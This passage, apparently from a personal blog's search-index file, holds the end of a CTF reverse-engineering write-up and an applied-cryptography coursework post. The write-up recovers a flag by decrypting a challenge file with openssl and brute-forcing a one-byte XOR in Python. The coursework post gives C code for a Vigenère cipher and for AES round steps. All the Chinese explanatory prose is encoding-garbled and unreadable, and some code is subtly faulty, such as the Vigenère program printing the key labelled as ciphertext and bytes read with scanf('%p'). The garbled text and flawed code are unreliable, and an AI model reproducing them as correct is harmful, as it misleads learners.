ä¸ºivæˆ‘æ²¡æ‰¾åˆ°ï¼Œæ„Ÿè§‰ä¸å¥½æ‰¾ã€‚</p><p>é¦–å…ˆæ˜¯ä¸€ä¸ªå¯¹<strong>GH65Hws2jedf3fl3MeK</strong>è¿›è¡Œmd5åŠ å¯†ï¼Œè¿½è¸ªå˜é‡ï¼Œå‘ç°å®ƒçš„ç»“æœæ˜¯ä½œä¸ºäº†åé¢aes_256_cbcçš„å¯†é’¥ã€‚</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801101838900.png" alt="image-20210801101838900"></p><p>ä½†è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œmd5åŠ å¯†ç»“æœæ˜¯16å­—èŠ‚ï¼Œè€Œè¿™é‡Œå¯†é’¥æ˜¯256ä½çš„ï¼Œè¦32å­—èŠ‚å—¯ã€‚ã€‚</p><p>ç„¶åçœ‹çœ‹md5å‡½æ•°åŠå¤–é¢å–ç»“æœçš„å‡½æ•°ï¼š</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801102132852-16283937318661.png" alt="image-20210801102132852"></p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801102147464.png" alt="image-20210801102147464"></p><p>æ‰€ä»¥è¯´ï¼Œç¨‹åºæ˜¯ç›´æ¥ä½¿ç”¨çš„åŠ å¯†ç»“æœçš„hexå½¢å¼ä½œä¸º32ä½å¯†é’¥ã€‚</p><p>æ¥ä¸‹æ¥ä½¿ç”¨opensslæ¥è§£å¯†è¯•è¯•ï¼Œ-dï¼šè§£å¯†  -Kï¼šæŒ‡å®šå¯†é’¥ï¼Œ-ivï¼šæŒ‡å®šivï¼Œ-inï¼šæŒ‡å®šè¦åŠ å¯†æˆ–è§£å¯†çš„æ–‡ä»¶ï¼Œä¸”æ³¨æ„keyå’Œivè¦ä»¥hexå½¢å¼ç»™å‡º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl aes-256-cbc -d -K 3834326434326239383837366635383166306466626566623063643262356333 -iv 1 -<span class="keyword">in</span> flag.php &gt; ans.txt</span><br></pre></td></tr></table></figure><p>è§£å¯†ï¼Œå¾—åˆ°ä¸€ä¸ªä¹±ç æ–‡ä»¶ã€‚</p><p>å†æ¬¡å›åˆ°ç¨‹åºä¸­åˆ†æåŠ å¯†å‡½æ•°ï¼šå‘ç°åœ¨åŠ å¯†ä¹‹åæœ‰ä¸€ä¸ªå¼‚æˆ–ï¼Œè§£å¯†ä¹‹å‰åŒæ ·å¯¹åº”ä¸€ä¸ªå¼‚æˆ–ã€‚</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801102919133.png" alt="image-20210801102919133"></p><p>è€Œè¿™ä¸ªv9ï¼Œæˆ‘å‘ä¸Šæ‰¾è¯¥å˜é‡çš„èµ‹å€¼åŠå›æº¯ï¼Œåœ¨è¯»æ–‡ä»¶è¿™é‡Œæ‰¾åˆ°ã€‚ã€‚ä½†è¿™ä¹Ÿæ˜¯ä¸çŸ¥é“çš„ã€‚</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801103055301.png" alt="image-20210801103055301"></p><p>å¥½åœ¨ä¸Šé¢å¼‚æˆ–çš„v9å˜é‡åªæ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è€ƒè™‘çˆ†ç ´ï¼Œæ‰¾åˆ°flag/</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"flag1.php"</span>, <span class="string">"rb"</span>)</span><br><span class="line">text = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">f1 = open(<span class="string">'flag.php'</span>, <span class="string">"wb"</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> text:</span><br><span class="line">f1.write(bytes([j^i]))</span><br><span class="line">os.system(<span class="string">'openssl aes-256-cbc -d -K 3834326434326239383837366635383166306466626566623063643262356333 -iv 1 -in flag.php &gt; ans.txt'</span>)</span><br><span class="line">a = open(<span class="string">'ans.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">ans = a.read()</span><br><span class="line"><span class="keyword">if</span> <span class="string">b'flag'</span> <span class="keyword">in</span> ans:</span><br><span class="line">print(<span class="string">"*"</span>*<span class="number">100</span>)</span><br><span class="line">print(i)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è§£å¯†ç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BD8hRUZflag&#123;47a3f7b1-499c-4e45-ed3e-404602cfef96&#125;<span class="string">";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo "</span>no my code&lt;/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åº”ç”¨å¯†ç å­¦</title>
      <link href="/2021/04/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>/2021/04/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹åº”ç”¨å¯†ç å­¦è¯¾ç¨‹çš„ä»£ç ä½œä¸šåŠå®éªŒã€‚<a id="more"></a></p><h3 id="Vigenere-Cipher"><a href="#Vigenere-Cipher" class="headerlink" title="Vigenere Cipher"></a>Vigenere Cipher</h3><p>Cè¯­è¨€ç®€å•å®ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> plain[] = <span class="string">"blockchaintechnology"</span>, plain_order[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> key[] = <span class="string">"cuitbo"</span>, key_order[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> enc[<span class="number">100</span>], enc_order[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(plain)<span class="number">-1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">plain_order[i] = plain[i]<span class="number">-97</span>;</span><br><span class="line">key_order[i] = key[i%<span class="number">6</span>]<span class="number">-97</span>;</span><br><span class="line">enc_order[i] = (plain_order[i]+key_order[i])%<span class="number">26</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"plain: %s\n"</span>, plain);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enc: %s\n"</span>, key);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"plain_order: "</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(plain)<span class="number">-1</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, plain_order[i]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enc_order: "</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(plain)<span class="number">-1</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, enc_order[i]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enc: "</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(plain)<span class="number">-1</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>, enc_order[i]+<span class="number">97</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AES-å˜æ¢æ“ä½œçš„å®ç°"><a href="#AES-å˜æ¢æ“ä½œçš„å®ç°" class="headerlink" title="AES å˜æ¢æ“ä½œçš„å®ç°"></a>AES å˜æ¢æ“ä½œçš„å®ç°</h3><p>ç”¨Cè¯­è¨€ç®€å•å®ç°ä¸€ä¸‹åŠ å¯†çš„å‡ ä¸ªè¿‡ç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getData_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printOut_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SubBytes_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddRoundKey_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> (*RoundKey_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShiftRows_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mix_columns_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> (*output_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">gfmultby_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> a, <span class="keyword">unsigned</span> <span class="keyword">char</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> Sbox_76[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="comment">// 0     1     2     3     4     5     6     7     8     9     a     b     c     d     e     f</span></span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>, <span class="comment">// 0</span></span><br><span class="line"><span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>, <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>, <span class="comment">// 1</span></span><br><span class="line"><span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>, <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="comment">// 2</span></span><br><span class="line"><span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>, <span class="comment">// 3</span></span><br><span class="line"><span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>, <span class="comment">// 4</span></span><br><span class="line"><span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>, <span class="comment">// 5</span></span><br><span class="line"><span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>, <span class="comment">// 6</span></span><br><span class="line"><span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>, <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>, <span class="comment">// 7</span></span><br><span class="line"><span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="comment">// 8</span></span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>, <span class="comment">// 9</span></span><br><span class="line"><span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>, <span class="comment">// a</span></span><br><span class="line"><span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>, <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>, <span class="comment">// b</span></span><br><span class="line"><span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="comment">// c</span></span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>, <span class="comment">// d</span></span><br><span class="line"><span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>, <span class="comment">// e</span></span><br><span class="line"><span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span>&#125;;<span class="comment">// f</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> mixValue_76[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">02</span>, <span class="number">03</span>, <span class="number">01</span>, <span class="number">01</span>,</span><br><span class="line">   <span class="number">01</span>, <span class="number">02</span>, <span class="number">03</span>, <span class="number">01</span>,</span><br><span class="line">   <span class="number">01</span>, <span class="number">01</span>, <span class="number">02</span>, <span class="number">03</span>,</span><br><span class="line">   <span class="number">03</span>, <span class="number">01</span>, <span class="number">01</span>, <span class="number">02</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> state_76[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> output_76[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> RoundKey_76[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"æ˜æ–‡ï¼š"</span>);</span><br><span class="line">getData_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"å¯†é’¥ï¼š"</span>);</span><br><span class="line">getData_76(RoundKey_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"è¾“å…¥æ˜æ–‡çŠ¶æ€çŸ©é˜µï¼š"</span>);</span><br><span class="line">printOut_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"è¾“å…¥128æ¯”ç‰¹åˆå§‹å¯†é’¥çŸ©é˜µï¼š"</span>);</span><br><span class="line">printOut_76(RoundKey_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"è½®å¯†é’¥è¿ç®—è¾“å‡ºï¼š"</span>);</span><br><span class="line">AddRoundKey_76(state_76, RoundKey_76);</span><br><span class="line">printOut_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"å­—èŠ‚æ›¿ä»£è¾“å‡ºï¼š"</span>);</span><br><span class="line">SubBytes_76(state_76);</span><br><span class="line">printOut_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"è¡Œç§»ä½è¾“å‡ºï¼š"</span>);</span><br><span class="line">ShiftRows_76(state_76);</span><br><span class="line">printOut_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"åˆ—æ··åˆè¾“å‡ºï¼š"</span>);</span><br><span class="line">mix_columns_76(state_76, output_76);</span><br><span class="line">printOut_76(output_76);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getData_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> input_76[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">16</span>; i_76++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%p"</span>, input_76+i_76);</span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line">data_76[j_76][i_76] = input_76[<span class="number">4</span>*i_76+j_76];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printOut_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X "</span>, data_76[i_76][j_76]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SubBytes_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line">state_76[i_76][j_76] = Sbox_76[state_76[i_76][j_76]];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span 